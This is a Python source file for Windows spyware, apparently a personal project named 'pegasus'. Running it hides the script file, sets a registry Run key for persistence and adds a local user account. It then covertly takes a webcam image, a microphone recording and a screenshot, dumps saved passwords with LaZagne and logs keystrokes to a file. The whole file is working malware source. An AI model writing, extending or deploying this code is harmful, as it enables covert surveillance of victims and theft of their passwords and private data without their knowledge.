import sounddevice as sd
import cv2
from scipy.io.wavfile import write
import wavio as wv
import numpy as np
import time
import pyautogui
from pynput.keyboard import Listener
import subprocess
import shutil, os, subprocess
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

freq = 44100
duration = 5

def hide_file():
	path = 'attrib +s +h "C:\\Users\\Dell\\OneDrive\\Desktop\\pegasus\\10.combining_all_functionality\\pegasus_spyware.py"'
	subprocess.call(path, shell= True)
	print("hiding_file")

hide_file()
	
def become_persistance():
	subprocess.call("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v pegasus /t REG_SZ /d 'C:\\Users\\Dell\\OneDrive\\Desktop\\pegasus\\PEGASUS\\pegasus.exe' ")
	print("persistent ..!")

become_persistance()

def esculate_priv():
	subprocess.run("net user pegasus /add")
	print("esculated priv")

esculate_priv()

def capture_image():
	camera = cv2.VideoCapture(0)
	return_value, image = camera.read()
	cv2.imwrite('capture_img'+'.png', image)
	del(camera)

capture_image()

def record_audio ():
	recording = sd.rec(int(duration * freq),samplerate=freq, channels=2)
	sd.wait()
	write("recording0.wav", freq, recording)

record_audio()

def capture_screen():	
	image = pyautogui.screenshot()
	image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR)
	cv2.imwrite("screenshot.png", image)

capture_screen()

def save_passwd():
	subprocess.call('python "C:\\Users\\Dell\\OneDrive\\Desktop\\pegasus\\LaZagne-2.4.3\\Windows\\laZagne.py" all > saved_password.txt' , shell = True)
	subprocess.call("exit", shell= True)
	
def getKey(key):
    key = fixKey(key)
    file = open('log.txt', 'a')
    file.write(key.replace('\'', '') + '')
    file.close()

def fixKey(key):
    key = str(key)
    if key == 'Key.space':
        return ' '
    elif key == 'Key.enter':
        return '\n'
    return key



def main():
    thread2 = threading.Thread(target=save_passwd, args=())
    thread2.start()

    
    with Listener(on_press=getKey) as listener:
        listener.join()

main()


